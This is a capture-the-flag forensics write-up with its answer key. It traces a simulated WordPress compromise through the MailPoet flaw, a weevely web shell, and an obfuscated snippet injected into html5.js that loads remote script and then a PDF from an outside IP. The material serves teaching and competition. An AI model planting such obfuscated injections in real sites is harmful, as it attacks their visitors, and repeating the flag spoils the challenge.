# Fluffy No More
## Author
Antoniweicz
## Points
300
## Category
Forensics
## Description
"OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious ""Forgotten Freaks"" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??
Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!"
## Flag
`key{Those Fluffy Bunnies Make Tummy Bumpy}`
## Solution
Within the apache log file (/var/logs/apache2/access.log) is an indicator of attack for the MailPoet vulnerability. Details here: [http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html](http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html)
I dont expect people to find that really, but maybe they will. The vulnerability is exploited and uploads two files to
```
/var/www/html/wp-content/uploads/wysija/themes/weblizer
```
template.php is a weevely shell. There is also a single execution command entry in the access.log of the attacker's modifications to the wordpress install, but people might not notice that either.
The attacker modified `/var/www/html/wp-content/themes/twentythirteen/js/html5.js` which only gets rendered if a user is using IE9 or below.
```
<!--[if lt IE 9]>
	<script src="http://blog.eyeheartfluffybunnies.com/wp-content/themes/twentythirteen/js/html5.js"></script>
	<![endif]-->
```
This is not attacker added code, but naturally occuring. You can see this from the source on the webpage. My expectation is people will actually create a LAMP server to replicate and notice this condition or do a diff of the plugins/themes.
However they get there, they'll hopefully notice that html5.js has a modification:
```
var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i<f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i<c.length;i++){if(((i==3||i==6)&&w!=2)||((i==8)&&w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("<"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'>\</"+m+"\>");
```
This is an obfuscated way to do a script include from [http://128.238.66.100/analytics.js](http://128.238.66.100/analytics.js)
Students could notice this, or maybe use developer mode in the browser to see the js include.
Once to `analytics.js`, there is more obfuscation its basically two giagantic blocks of dummy code around:
```
var _0x91fe=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66","\x5F\x73\x65\x6C\x66","\x6F\x70\x65\x6E"];window[_0x91fe[2]](_0x91fe[0],_0x91fe[1]);
```
This opens a new window that renders [http://128.238.66.100/announcement.pdf](http://128.238.66.100/announcement.pdf)
I expect that students will either use a user-agent switcher or <IE9 to get the request for announcement.pdf. I dont know that anyone will deal with the javascript.
Then the announcement.pdf has a file stream in it, you can
```
pdfextract announcement.pdf
cd announcement.dump/streams
cat steam_8
```
to see another javascript obfuscated version of:
```
var key = "YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}";
```
## Setup
